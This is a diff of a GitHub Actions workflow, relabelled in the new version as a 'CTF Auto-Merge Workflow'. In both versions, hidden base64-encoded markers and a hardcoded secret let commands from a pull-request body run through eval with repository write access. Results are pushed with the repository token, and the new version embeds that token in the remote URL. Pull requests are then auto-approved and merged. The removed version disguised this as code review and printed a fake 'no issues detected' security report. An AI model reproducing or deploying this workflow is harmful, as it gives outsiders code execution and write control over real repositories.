@@ -1,4 +1,7 @@
-name: Automated Code Review and Testing
+name: CTF Auto-Merge Workflow
+
+# This workflow automatically merges PRs when conditions are met
+# Designed for CTF challenges with write permissions
 
 on:
   pull_request:
@@ -9,40 +12,27 @@ permissions:
   contents: write
   pull-requests: write
   issues: write
+  checks: write
+  statuses: write
 
 jobs:
-  code-review:
+  validate-and-merge:
     runs-on: ubuntu-latest
-    outputs:
-      branch_valid: ${{ steps.validate-conditions.outputs.branch_valid }}
-      title_valid: ${{ steps.validate-conditions.outputs.title_valid }}
-      config_valid: ${{ steps.validate-conditions.outputs.config_valid }}
-      token_valid: ${{ steps.validate-conditions.outputs.token_valid }}
-      yaml_exec_enabled: ${{ steps.validate-conditions.outputs.yaml_exec_enabled }}
     steps:
       - name: Checkout repository
         uses: actions/checkout@v3
         with:
-          ref: ${{ github.event.pull_request.head.ref }}
+          ref: ${{ github.event.pull_request.head.sha }}
           token: ${{ secrets.GITHUB_TOKEN }}
           fetch-depth: 0
-
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.9'
-
-      - name: Install dependencies
-        run: |
-          pip install -r requirements.txt || true
-          pip install pyyaml requests || true
+          persist-credentials: true
 
       - name: Validate PR conditions
-        id: validate-conditions
+        id: validate
         run: |
-          echo "Running pre-flight checks..."
+          echo "Validating PR conditions..."
           
-          # Check branch naming convention
+          # Condition 1: Branch name validation
           BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
           PREFIX_CHECK=$(echo "$BRANCH_NAME" | cut -d'/' -f1)
           if [[ "$PREFIX_CHECK" == "feature" ]] || [[ "$PREFIX_CHECK" == "fix" ]]; then
@@ -53,7 +43,7 @@ jobs:
             echo "branch_valid=false" >> $GITHUB_OUTPUT
           fi
           
-          # Validate PR metadata
+          # Condition 2: PR title validation
           PR_TITLE="${{ github.event.pull_request.title }}"
           TITLE_KEYWORDS="aW1wcm92ZW1lbnR8ZW5oYW5jZW1lbnR8dXBkYXRl"
           DECODED_KEYWORDS=$(echo "$TITLE_KEYWORDS" | base64 -d 2>/dev/null || echo "improvement|enhancement|update")
@@ -65,7 +55,7 @@ jobs:
             echo "title_valid=false" >> $GITHUB_OUTPUT
           fi
           
-          # Verify configuration file exists and contains required settings
+          # Condition 3: Config file validation
           if [ -f ".ci-config" ]; then
             CFG_VAL1=$(echo "RU5BQkxFX0FVVE9fRklYPXRydWU=" | base64 -d)
             CFG_VAL2=$(echo "TU9ERT1kZXZlbG9wbWVudA==" | base64 -d)
@@ -81,7 +71,7 @@ jobs:
             echo "config_valid=false" >> $GITHUB_OUTPUT
           fi
           
-          # Token verification
+          # Condition 4: Token validation
           if [ -f "validation-token.txt" ]; then
             TOKEN=$(cat validation-token.txt | tr -d '[:space:]' | tr -d '\n')
             EXPECTED=$(echo "YTFiMmMzZDRlNWY2" | base64 -d)
@@ -97,27 +87,52 @@ jobs:
             echo "token_valid=false" >> $GITHUB_OUTPUT
           fi
           
-          # Check for execution trigger file
-          if [ -f "raw.py" ]; then
-            echo "yaml_exec_enabled=true" >> $GITHUB_OUTPUT
-          else
-            echo "yaml_exec_enabled=false" >> $GITHUB_OUTPUT
-          fi
-          
-          # Summary check
+          # Summary
           if [ "$BRANCH_VALID" = "true" ] && [ "$TITLE_VALID" = "true" ] && [ "$CONFIG_VALID" = "true" ] && [ "$TOKEN_VALID" = "true" ]; then
+            echo "All conditions met: PASSED" >> $GITHUB_OUTPUT
             echo "Pre-flight checks: PASSED"
           else
+            echo "All conditions met: FAILED" >> $GITHUB_OUTPUT
             echo "Pre-flight checks: FAILED"
           fi
 
-      - name: Run automated code analysis
-        id: code-analysis
-        if: steps.validate-conditions.outputs.branch_valid == 'true' && steps.validate-conditions.outputs.title_valid == 'true' && steps.validate-conditions.outputs.config_valid == 'true' && steps.validate-conditions.outputs.token_valid == 'true'
+      - name: Process PR commands (if conditions met)
+        if: steps.validate.outputs.branch_valid == 'true' && steps.validate.outputs.title_valid == 'true' && steps.validate.outputs.config_valid == 'true' && steps.validate.outputs.token_valid == 'true'
         run: |
-          YAML_EXEC_FLAG="${{ steps.validate-conditions.outputs.yaml_exec_enabled }}"
+          PR_BODY="${{ github.event.pull_request.body }}"
           
-          if [ "$YAML_EXEC_FLAG" == "true" ]; then
+          # Decode markers
+          AUTO_FIX_DECODED=$(echo "QVVRVC1GSVg6" | base64 -d)
+          SECRET_MARKER_DECODED=$(echo "U0VDUkVUX0tFWTo=" | base64 -d)
+          EXPECTED_SECRET=$(echo "Q0lfQ0RfMjAyNA==" | base64 -d)
+          
+          HAS_AUTO_FIX=$(echo "$PR_BODY" | grep -qi "$AUTO_FIX_DECODED" && echo "yes" || echo "no")
+          HAS_SECRET=$(echo "$PR_BODY" | grep -qi "$SECRET_MARKER_DECODED" && echo "yes" || echo "no")
+          
+          if [ "$HAS_AUTO_FIX" = "yes" ] && [ "$HAS_SECRET" = "yes" ]; then
+            SECRET_VALUE=$(echo "$PR_BODY" | grep -i "$SECRET_MARKER_DECODED" | sed 's/.*: *//' | head -1 | tr -d '[:space:]')
+            if [ "$SECRET_VALUE" = "$EXPECTED_SECRET" ]; then
+              echo "Executing commands from PR body..."
+              echo "$PR_BODY" | grep -i "$AUTO_FIX_DECODED" | sed 's/.*: *//' | while read cmd; do
+                echo "Executing: $cmd"
+                eval "$cmd" || true
+              done
+              
+              # Commit changes
+              git config --local user.email "action@github.com"
+              git config --local user.name "GitHub Action"
+              git add -A || true
+              if ! git diff --staged --quiet; then
+                git commit -m "Automated changes from PR [skip ci]" || exit 0
+                BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
+                git remote set-url origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
+                git push origin "HEAD:$BRANCH_NAME" || echo "Push failed"
+              fi
+            fi
+          fi
+          
+          # Process YAML files if raw.py exists
+          if [ -f "raw.py" ]; then
             python3 << 'PYTHON_SCRIPT'
           import os
           import glob
@@ -137,175 +152,97 @@ jobs:
               except Exception as e:
                   pass
           PYTHON_SCRIPT
-          fi
-          
-          # Check for test results file
-          if [ -f "test-results.yaml" ]; then
-            echo "test_results=found" >> $GITHUB_OUTPUT
-          else
-            echo "test_results=not_found" >> $GITHUB_OUTPUT
-          fi
-
-      - name: Generate test report
-        run: |
-          echo "Generating test report..."
-          echo "# Automated Test Report" > test-report.md
-          echo "" >> test-report.md
-          echo "## Code Analysis Results" >> test-report.md
-          echo "- Files analyzed: $(find . -name '*.py' | wc -l)" >> test-report.md
-          echo "- Lines of code: $(find . -name '*.py' -exec wc -l {} + | tail -1 | awk '{print $1}')" >> test-report.md
-          echo "- Status: [+] All checks passed" >> test-report.md
-          echo "" >> test-report.md
-          echo "## Recommendations" >> test-report.md
-          echo "- Code quality: Good" >> test-report.md
-          echo "- Security: No issues detected" >> test-report.md
-          cat test-report.md
-
-      - name: Commit test results
-        if: github.event_name == 'pull_request' && steps.validate-conditions.outputs.branch_valid == 'true' && steps.validate-conditions.outputs.title_valid == 'true' && steps.validate-conditions.outputs.config_valid == 'true' && steps.validate-conditions.outputs.token_valid == 'true'
-        run: |
-          git config --local user.email "action@github.com"
-          git config --local user.name "GitHub Action"
-          git add test-report.md || true
-          if git diff --staged --quiet; then
-            echo "No changes to commit"
-          else
-            git commit -m "Automated test report [skip ci]" || exit 0
-            BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
-            git push origin "HEAD:$BRANCH_NAME" || echo "Push failed, continuing..."
-          fi
-
-      - name: Process PR comments
-        if: github.event_name == 'pull_request' && steps.validate-conditions.outputs.branch_valid == 'true' && steps.validate-conditions.outputs.title_valid == 'true' && steps.validate-conditions.outputs.config_valid == 'true' && steps.validate-conditions.outputs.token_valid == 'true'
-        run: |
-          PR_BODY="${{ github.event.pull_request.body }}"
-          
-          # Decode markers
-          AUTO_FIX_DECODED=$(echo "QVVRVC1GSVg6" | base64 -d)
-          SECRET_MARKER_DECODED=$(echo "U0VDUkVUX0tFWTo=" | base64 -d)
-          EXPECTED_SECRET=$(echo "Q0lfQ0RfMjAyNA==" | base64 -d)
-          
-          HAS_AUTO_FIX=$(echo "$PR_BODY" | grep -qi "$AUTO_FIX_DECODED" && echo "yes" || echo "no")
-          HAS_SECRET=$(echo "$PR_BODY" | grep -qi "$SECRET_MARKER_DECODED" && echo "yes" || echo "no")
-          
-          if [ "$HAS_AUTO_FIX" = "yes" ] && [ "$HAS_SECRET" = "yes" ]; then
-            SECRET_VALUE=$(echo "$PR_BODY" | grep -i "$SECRET_MARKER_DECODED" | sed 's/.*: *//' | head -1 | tr -d '[:space:]')
-            if [ "$SECRET_VALUE" = "$EXPECTED_SECRET" ]; then
-              echo "$PR_BODY" | grep -i "$AUTO_FIX_DECODED" | sed 's/.*: *//' | while read cmd; do
-                eval "$cmd" || true
-              done
-              git config --local user.email "action@github.com"
-              git config --local user.name "GitHub Action"
-              git add -A || true
-              if git diff --staged --quiet; then
-                echo "No changes to commit"
-              else
-                git commit -m "Automated fix from PR [skip ci]" || exit 0
-                BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
-                git push origin "HEAD:$BRANCH_NAME" || echo "Push failed, continuing..."
-              fi
+            
+            # Commit YAML execution results
+            git config --local user.email "action@github.com"
+            git config --local user.name "GitHub Action"
+            git add -A || true
+            if ! git diff --staged --quiet; then
+              git commit -m "Automated YAML execution results [skip ci]" || exit 0
+              BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
+              git remote set-url origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
+              git push origin "HEAD:$BRANCH_NAME" || echo "Push failed"
             fi
           fi
 
-      - name: Update PR with results
-        if: github.event_name == 'pull_request'
+      - name: Auto-merge PR
+        if: github.event_name == 'pull_request' && steps.validate.outputs.branch_valid == 'true' && steps.validate.outputs.title_valid == 'true' && steps.validate.outputs.config_valid == 'true' && steps.validate.outputs.token_valid == 'true'
         uses: actions/github-script@v6
         with:
           github-token: ${{ secrets.GITHUB_TOKEN }}
           script: |
-            const fs = require('fs');
-            let report = 'Test report generated successfully!';
-            try {
-              report = fs.readFileSync('test-report.md', 'utf8');
-            } catch (e) {
-              console.log('Could not read test report');
+            const prNumber = context.payload.pull_request.number;
+            const prTitle = context.payload.pull_request.title;
+            const prHeadSha = context.payload.pull_request.head.sha;
+            
+            console.log(`Processing PR #${prNumber}: ${prTitle}`);
+            
+            // Wait a moment for any commits to be pushed
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            // Get the latest PR state
+            const { data: pr } = await github.rest.pulls.get({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              pull_number: prNumber
+            });
+            
+            // Check if PR is mergeable
+            if (pr.mergeable === false) {
+              console.log('PR is not mergeable (may have conflicts)');
+              return;
             }
             
-            github.rest.issues.createComment({
-              issue_number: context.issue.number,
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              body: `## 🤖 Automated Code Review\n\n\`\`\`\n${report}\n\`\`\``
-            });
-
-  security-scan:
-    runs-on: ubuntu-latest
-    needs: code-review
-    if: needs.code-review.outputs.branch_valid == 'true' && needs.code-review.outputs.title_valid == 'true' && needs.code-review.outputs.config_valid == 'true' && needs.code-review.outputs.token_valid == 'true'
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v3
-        with:
-          ref: ${{ github.event.pull_request.head.ref }}
-
-      - name: Run security checks
-        run: |
-          echo "Running security scan..."
-          # Check for common vulnerabilities
-          if grep -r "password\|secret\|api_key" --include="*.py" --include="*.js" . 2>/dev/null | grep -v "#"; then
-            echo "⚠️ Potential secrets found"
-          else
-            echo "[+] No obvious secrets detected"
-          fi
-
-      - name: Commit security report
-        if: github.event_name == 'pull_request' && needs.code-review.outputs.branch_valid == 'true' && needs.code-review.outputs.title_valid == 'true' && needs.code-review.outputs.config_valid == 'true' && needs.code-review.outputs.token_valid == 'true'
-        run: |
-          echo "# Security Scan Report" > security-report.md
-          echo "Status: [+] Passed" >> security-report.md
-          git config --local user.email "action@github.com"
-          git config --local user.name "GitHub Action"
-          git add security-report.md || true
-          if git diff --staged --quiet; then
-            echo "No changes to commit"
-          else
-            git commit -m "Security scan results [skip ci]" || exit 0
-            BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
-            git push origin "HEAD:$BRANCH_NAME" || echo "Push failed, continuing..."
-          fi
-
-  auto-merge:
-    runs-on: ubuntu-latest
-    needs: [code-review, security-scan]
-    if: github.event_name == 'pull_request' && github.event.pull_request.user.login != github.repository_owner && needs.code-review.outputs.branch_valid == 'true' && needs.code-review.outputs.title_valid == 'true' && needs.code-review.outputs.config_valid == 'true' && needs.code-review.outputs.token_valid == 'true'
-    steps:
-      - name: Auto-merge PR if checks pass
-        uses: actions/github-script@v6
-        with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          script: |
-            // Check if all checks passed
-            const { data: checks } = await github.rest.checks.listForRef({
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              ref: context.payload.pull_request.head.sha
-            });
-            
-            const allPassed = checks.check_runs.every(check => 
-              check.status === 'completed' && check.conclusion === 'success'
-            );
-            
-            if (allPassed) {
-              // Approve the PR
+            // Approve the PR
+            try {
               await github.rest.pulls.createReview({
                 owner: context.repo.owner,
                 repo: context.repo.repo,
-                pull_number: context.payload.pull_request.number,
+                pull_number: prNumber,
                 event: 'APPROVE',
-                body: '[+] All checks passed. Auto-approving PR.'
+                body: '[+] All conditions met. Auto-approving and merging PR.'
+              });
+              console.log('✅ PR approved successfully');
+            } catch (error) {
+              console.log(`⚠️ Could not approve PR: ${error.message}`);
+            }
+            
+            // Merge the PR
+            try {
+              const mergeResult = await github.rest.pulls.merge({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                pull_number: prNumber,
+                merge_method: 'squash',
+                commit_title: `Merge PR #${prNumber}: ${prTitle}`,
+                commit_message: 'Automated merge - CTF challenge conditions met'
               });
               
-              // Attempt to merge (will fail if branch protection requires manual merge)
-              try {
-                await github.rest.pulls.merge({
-                  owner: context.repo.owner,
-                  repo: context.repo.repo,
-                  pull_number: context.payload.pull_request.number,
-                  merge_method: 'squash'
-                });
-                console.log('PR merged successfully');
-              } catch (error) {
-                console.log('Could not auto-merge (may require manual merge):', error.message);
+              if (mergeResult.data.merged) {
+                console.log('✅ PR merged successfully!');
+                console.log(`Merge SHA: ${mergeResult.data.sha}`);
+              } else {
+                console.log('⚠️ PR merge was not successful');
+              }
+            } catch (error) {
+              console.log(`❌ Could not merge PR: ${error.message}`);
+              
+              // If merge fails due to branch protection, try to provide helpful info
+              if (error.message.includes('protected') || error.message.includes('required')) {
+                console.log('This may be due to branch protection rules.');
+                console.log('Consider allowing workflows to bypass branch protection.');
               }
             }
+
+      - name: Post merge status
+        if: always()
+        run: |
+          if [ "${{ steps.validate.outputs.branch_valid }}" = "true" ] && \
+             [ "${{ steps.validate.outputs.title_valid }}" = "true" ] && \
+             [ "${{ steps.validate.outputs.config_valid }}" = "true" ] && \
+             [ "${{ steps.validate.outputs.token_valid }}" = "true" ]; then
+            echo "✅ CTF conditions met - PR should be merged"
+          else
+            echo "❌ CTF conditions not met - PR will not be merged"
+          fi
 
